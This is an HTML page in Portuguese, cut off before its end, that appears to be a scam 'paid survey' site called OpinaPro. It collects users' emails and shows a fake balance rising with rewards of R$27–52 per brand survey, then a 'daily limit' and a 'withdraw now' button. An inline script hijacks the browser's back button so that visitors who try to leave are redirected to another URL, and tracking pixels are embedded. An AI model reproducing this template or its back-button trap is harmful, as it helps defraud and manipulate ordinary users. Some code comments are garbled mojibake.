<!DOCTYPE html><html lang="pt-BR"><head>
  <script src="js/script.js" async="" data-tracking-id="DyJ2Dcchti" crossorigin="anonymous"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&amp;display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/styles.css">
  <script src="js/jquery-3.6.4.min.js"></script>
  <script src="js/js.cookie.min.js"></script>
  </head><body><audio id="meuAudio"><source src="media/dinheiro.mp3" type="audio/mp3"></audio>
  
  <script>
  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
  const link = 'https://br-opinapro.netlify.app';

  function setBackRedirect(url) {
    let urlBackRedirect = url;
    urlBackRedirect = urlBackRedirect =
      urlBackRedirect.trim() +
      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
      document.location.search.replace('?', '').toString();

    history.pushState({}, '', location.href);
    history.pushState({}, '', location.href);
    history.pushState({}, '', location.href);

    window.addEventListener('popstate', () => {
      console.log('onpopstate', urlBackRedirect);
      setTimeout(() => {
        location.href = urlBackRedirect;
      }, 1);
    });
  }

  setBackRedirect(link);
</script>
  
  <!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '377045655124175');
  fbq('track', 'PageView');
</script>
<noscript>
  <img height="1" width="1" style="display:none" 
       src="https://www.facebook.com/tr?id=377045655124175&ev=PageView&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->

<!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1349771808904359');
  fbq('track', 'PageView');
</script>
<noscript>
  <img height="1" width="1" style="display:none" 
       src="https://www.facebook.com/tr?id=1349771808904359&ev=PageView&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->


  


  
  <!--------------------- Pagina de login" --------------------->
  
  
  <div id="login" style="display: block;">
        
    <div style="padding-top:30%;"></div>

        <div class="outer-box-login">
          <div class="white-box-login">
            <img src="images/opinilogo.png" style="width:30%; margin: 0 auto; display: flex;">
            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao OpinaPro</p>
            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-size: 15px;">Insira seu e-mail para prosseguir!</p>
            
            <input for="email" type="text" name="email" id="email" class="form-input" style="margin-top:20px;" placeholder="E-mail" oninput="validateEmail()">
            <button class="prosseguir-button" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#">ENTRAR</button>
                
            <div style="margin-bottom: 10px;"></div>
                

               
          </div>  
        </div>
    

        <div class="footer-text">
          <p style="text-align: center; color: rgb(101, 101, 101); font-size: 15px; margin-top: 30px; font-weight: bold;">2024 OpinaPro LLC</p>
          <p style="text-align: center; color: rgb(101, 101, 101); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">Termos e Politica de Privacidade</p>
        </div>



  </div>
  
  
  



  
  <div id="inicio" style="display: none;">

        <div class="menu">
          <a style="width: 50%; ">
            <img src="images/opinilogo.png">
          </a>
          <div style="width: 45%;" class="buttons-container" href="#" onclick="mostrarPagina('saque')">
            <div class="valor-box">
              <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">R$ 100.00</span>
            </div>
          </div>
        </div>
        <div style="margin-bottom: 100px;"></div>
          
        
    <!--------------------- Anuncio 1 --------------------->
    
    <div class="outer-box" id="ad1" style="display: block;">
      <div class="white-box">
         
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$33,00!</p>
          
          <div class="imagem">
            <img src="images/caixa.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>

          <p class="pergunta-whats">De 1 a 5, que nota voce da para o atendimento do banco Inter?</p>

          <div class="rating-container" id="rating-container-1">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Em um banco, voce prefere um cartao com limite maior ou menores taxas?</p>

          <div class="rating-container" id="rating-container-2">
            <button class="rating-button" data-rating="1">Limite maior</button>
            <button class="rating-button" data-rating="2">Menores taxas</button>
          </div>

          <p class="pergunta-whats">Voce faria um emprestimo nesse banco atualmente?</p>

          <div class="rating-container" id="rating-container-3">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao </button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B1" onclick="showLoadingB1();">Enviar respostas</button>

              
      </div>
    </div>
    
    <!---- Popup B1 ---->
        
        <div class="popup-container" id="popupB1">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

         <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
          
          <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
          <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 33,00</span>
        
        </div>
        
    
    <!--------------------- Anuncio 2 --------------------->
    
    <div class="outer-box" id="ad2" style="display: none;">
      <div class="white-box">
              
        <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$34,00!</p>
          
        <div class="imagem">
          <img src="images/bancobrasil.png" style="width: 50%; margin: 0 auto; display: flex; border-radius: 15px;">
        </div>

        <p class="pergunta-whats">De 1 a 5, que nota voce da para o atendimento do Nubank?</p>

        <div class="rating-container" id="rating-container-4">
          <button class="rating-button" data-rating="1">1 </button>
          <button class="rating-button" data-rating="2">2 </button>
          <button class="rating-button" data-rating="3">3 </button>
          <button class="rating-button" data-rating="4">4 </button>
          <button class="rating-button" data-rating="5">5 </button>
        </div>
        
        <p class="pergunta-whats">Em um banco, voce prefere um cartao com limite maior ou menores taxas?</p>

        <div class="rating-container" id="rating-container-5">
          <button class="rating-button" data-rating="1">Limite maior</button>
          <button class="rating-button" data-rating="2">Menores taxas</button>
        </div>

        <p class="pergunta-whats">Voce faria um emprestimo nesse banco atualmente?</p>

        <div class="rating-container" id="rating-container-6">
          <button class="rating-button" data-rating="1">Sim</button>
          <button class="rating-button" data-rating="2">Nao </button>
        </div>
            
        <button type="button" class="enviarCodigo" id="B2" onclick="showLoadingB2();">Enviar respostas</button>

              
      </div>
    </div>
    
    <!---- Popup B2 ---->
        
        <div class="popup-container" id="popupB2">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 34,00</span>
         

        </div>
    
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p3" ---------------------->
    
      <div class="outer-box" id="ad3" style="display: none;">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$47,00!</p>
          
          <div class="imagem">
            <img src="images/apple.png" style="width: 20%; margin: 0 auto; display: flex; border-radius: 15px;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Samsung?</p>
  
          <div class="rating-container" id="rating-container-7">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Em uma loja de Eletronicos, voce prefere mais Celular ou Tablet?</p>
  
          <div class="rating-container" id="rating-container-8">
            <button class="rating-button" data-rating="1">Celular</button>
            <button class="rating-button" data-rating="2">Tablet</button>
          </div>
  
          <p class="pergunta-whats">Com base na sua experiencia geral, voce recomendaria a Samgung a amigos e familiares?</p>
  
          <div class="rating-container" id="rating-container-9">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao </button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B3" onclick="showLoadingB3();">Enviar respostas</button>
  
            
        </div>
      </div>
        
        
        <!---- Popup B3 ---->
        
        <div class="popup-container" id="popupB3">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 47,00</span>
         
        
        </div>
    
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p4" ---------------------->
    
    <div class="outer-box" id="ad4" style="display: none;">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$43,00!</p>
          
          <div class="imagem">
            <img src="images/amazon.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para o Aliexpress?</p>
  
          <div class="rating-container" id="rating-container-10">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce prefere comprar produtos pela internet ou loja fisica?</p>
  
          <div class="rating-container" id="rating-container-11">
            <button class="rating-button" data-rating="1">Internet</button>
            <button class="rating-button" data-rating="2">Pessoalmente</button>
          </div>
  
          <p class="pergunta-whats">Voce ja chegou a usar Aliexpress?</p>
  
          <div class="rating-container" id="rating-container-12">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao </button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B4" onclick="showLoadingB4();">Enviar respostas</button>
  
            
        </div>
      </div>
        
        <!---- Popup B4 ---->
        
        <div class="popup-container" id="popupB4">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
         
        
        </div>
    
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p5" ---------------------->
    
    <div class="outer-box" id="ad5" style="display: none;">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$52,00!</p>
          
          <div class="imagem">
            <img src="images/ambev.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Heineken?</p>
  
          <div class="rating-container" id="rating-container-13">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce prefere comprar Heineken com alcool ou sem alcool?</p>
  
          <div class="rating-container" id="rating-container-14">
            <button class="rating-button" data-rating="1">Com</button>
            <button class="rating-button" data-rating="2">Sem</button>
          </div>
  
          <p class="pergunta-whats">Voce ja chegou a consumir a Heineken sem alcool?</p>
  
          <div class="rating-container" id="rating-container-15">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao </button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B5" onclick="showLoadingB5();">Enviar respostas</button>
  
            
        </div>
      </div> 
        
        <!---- Popup B5 ---->
        
        <div class="popup-container" id="popupB5">
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 52,00</span>
         
        </div>
        
        
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p6" ---------------------->
    
      <div class="outer-box" id="ad6" style="display: none">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$32,00!</p>
          
          <div class="imagem">
            <img src="images/mcdonalds.png" style="width: 35%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para o McDonald's?</p>
  
          <div class="rating-container" id="rating-container-16">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce ja comprou algum lanche no McDonald's?</p>
  
          <div class="rating-container" id="rating-container-17">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
  
          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar o McDonald's?</p>
  
          <div class="rating-container" id="rating-container-18">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B6" onclick="showLoadingB6();">Enviar respostas</button>
  
            
        </div>
      </div>
        
        <!---- Popup B6 ---->
        
        <div class="popup-container" id="popupB6">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
         
        
        </div>    
        
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p7" ---------------------->
    
      <div class="outer-box" id="ad7" style="display: none">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$32,00!</p>
          
          <div class="imagem">
            <img src="images/burguerking.png" style="width: 20%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para o Burguer King?</p>
  
          <div class="rating-container" id="rating-container-19">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce ja comprou algum lanche no Burguer King?</p>
  
          <div class="rating-container" id="rating-container-20">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
  
          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar o Burguer King?</p>
  
          <div class="rating-container" id="rating-container-21">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B7" onclick="showLoadingB7();">Enviar respostas</button>
  
            
        </div>
      </div>  
        
        <!---- Popup B7 ---->
        
        <div class="popup-container" id="popupB7">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
         
        
        </div>
        
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p8" ---------------------->
    
      <div class="outer-box" id="ad8" style="display: none">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$27,00!</p>
          
          <div class="imagem">
            <img src="images/vivo.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Vivo?</p>
  
          <div class="rating-container" id="rating-container-22">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce ja comprou algum produto da Vivo?</p>
  
          <div class="rating-container" id="rating-container-23">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
  
          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Vivo?</p>
  
          <div class="rating-container" id="rating-container-24">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B8" onclick="showLoadingB8();">Enviar respostas</button>
  
            
        </div>
      </div> 
        
        <!---- Popup B8 ---->
        
        <div class="popup-container" id="popupB8">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 27,00</span>
         
        
        </div>     
        
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p9" ---------------------->
    
      <div class="outer-box" id="ad9" style="display: none">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$30,00!</p>
          
          <div class="imagem">
            <img src="images/claro.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Claro?</p>
  
          <div class="rating-container" id="rating-container-25">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce ja comprou algum produto da Claro?</p>
  
          <div class="rating-container" id="rating-container-26">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
  
          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Claro?</p>
  
          <div class="rating-container" id="rating-container-27">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B9" onclick="showLoadingB9();">Enviar respostas</button>
  
            
        </div>
      </div> 
        
        <!---- Popup B9 ---->
        
      <div class="popup-container" id="popupB9">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 30,00</span>
         
        
      </div>     
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p10" ---------------------->
    
      <div class="outer-box" id="ad10" style="display: none">
        <div class="white-box">
            
          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$43,00!</p>
          
          <div class="imagem">
            <img src="images/tim.png" style="width: 50%; margin: 0 auto; display: flex;">
          </div>
  
          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Tim?</p>
  
          <div class="rating-container" id="rating-container-28">
            <button class="rating-button" data-rating="1">1 </button>
            <button class="rating-button" data-rating="2">2 </button>
            <button class="rating-button" data-rating="3">3 </button>
            <button class="rating-button" data-rating="4">4 </button>
            <button class="rating-button" data-rating="5">5 </button>
          </div>
          
          <p class="pergunta-whats">Voce ja comprou algum produto da Tim?</p>
  
          <div class="rating-container" id="rating-container-29">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
  
          <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Tim?</p>
  
          <div class="rating-container" id="rating-container-30">
            <button class="rating-button" data-rating="1">Sim</button>
            <button class="rating-button" data-rating="2">Nao</button>
          </div>
              
          <button type="button" class="enviarCodigo" id="B10" onclick="showLoadingB10();">Enviar respostas</button>
  
            
        </div>
      </div> 
        
        <!---- Popup B10 ---->
        
        <div class="popup-container" id="popupB10">
        
          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 

          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
           
           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
         
        
        </div> 
    
    
    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p11" ---------------------->
    
     
        <div class="white-box" id="ad11" style="display: none">
        </div>
    
    
    
    
    
    `
    
    
    
    
    
    

    <!--------------------- Limite atingido --------------------->
    
  
    <div class="popup-containerL" id="popupL">

      <div id="container-progresso" style="display: flex; margin: 0 auto; width: 300px; height: 300px;">
          <svg viewBox="0 0 36 36" id="barra-progresso-svg">
              <circle cx="18" cy="18" r="16" fill="none" stroke="#ccc" stroke-width="3"></circle>
              <circle cx="18" cy="18" r="16" fill="none" stroke="#06B32E" stroke-width="3" id="minha-barra-progresso" stroke-dasharray="0 1000"></circle>
          </svg>
      
          <div id="texto-progresso">
              <span id="valor-saque" style="font-family: 'Montserrat', sans-serif; font-size: 23px;">R$100.00</span>
              <span style="font-family: 'Montserrat', sans-serif; color: #202020; font-size: 14px;">Seu saldo subiu!</span>
          </div>
      </div>
      
      

      <p style="font-family: 'Montserrat', sans-serif; font-size: 32px; color: #28a745; text-align: center; margin-top: 15px; margin-bottom: -5px;">Parabens!</p>      

      <p class="popup-textL" style="margin-bottom: 20px; font-size: 18px; color: #636363">Voce atingiu seu<br>limite diario!</p>
      
    
      <button class="desbloquear-button" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;" href="#" onclick="mostrarPagina('saque')">SAQUE AGORA</button>
      


     
    



      
      
    </div>


    
    <!--------------------- Menu debaixo --------------------->

    
    <div style="margin-bottom: 80px;"></div>

    
    <div class="menuemb">
